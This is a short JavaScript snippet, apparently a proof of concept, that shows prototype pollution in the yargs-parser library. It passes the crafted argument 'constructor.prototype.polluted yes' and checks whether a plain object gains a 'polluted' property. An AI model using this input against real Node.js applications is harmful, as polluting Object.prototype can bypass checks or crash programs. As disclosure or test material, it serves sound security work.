Object.prototype.hasOwnProperty = () => true;
console.log({}.polluted);
const parser = require('yargs-parser');
parser('constructor.prototype.polluted yes');
console.log({}.polluted);